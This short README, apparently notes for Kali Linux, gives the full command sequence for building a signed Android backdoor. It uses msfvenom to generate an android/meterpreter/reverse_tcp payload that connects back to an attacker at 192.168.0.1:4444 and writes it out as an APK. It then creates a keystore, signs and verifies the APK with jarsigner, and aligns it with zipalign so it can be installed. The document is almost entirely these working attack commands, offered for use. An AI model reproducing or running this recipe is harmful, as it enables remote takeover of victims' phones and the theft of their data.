# kali-ms


msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 > reverse_tcp_.apk


## keytool

keytool -genkey -V -keystore key.keystore -alias krnick -keyalg RSA -keysize 2048 -validity 1000


## check your key content

keytool -list -keystore key.keystore

## Sign

jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore key.keystore reverse_tcp.apk krnick

## check signing

jarsigner -verify -verbose -certs reverse_tcp.apk

## optimization

zipalign -v 4 reverse_tcp.apk singed_reverse_tcp.apk
